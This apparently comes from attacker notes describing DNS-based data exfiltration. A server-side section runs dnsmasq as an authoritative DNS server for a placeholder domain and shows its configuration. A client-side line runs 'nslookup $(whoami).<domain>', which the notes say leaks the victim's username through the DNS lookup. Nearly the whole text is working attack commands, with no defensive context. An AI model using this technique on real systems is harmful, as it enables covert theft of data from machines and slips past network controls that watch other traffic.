----------------------------------------------
ServerSide

sudo dnsmasq -C dnsmasq.conf -d #<--- Setup a minimal DNS server enviroment following dnsmasq.conf configuration (more information in the notes) and in foreground.

#dnsmasq_txt.conf file contents

# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=<dnsmasq.confDOMAIN>
auth-server=<dnsmasq.confDOMAIN>

----------------------------------------------
ClienteSide

nslookup $(whoami).<dnsmasq.confDOMAIN> #<---Since the nslookup is searching some subdomain on the domain configured on the dnsmasq.conf file, our DNS server will act as the authoritative name server and will displays the subdomain searched exfiltrating data from the client side.
